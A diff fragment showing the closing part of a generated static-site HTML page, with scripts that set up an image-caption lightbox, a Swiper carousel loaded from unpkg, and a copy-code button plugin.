+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+</div></body></html>
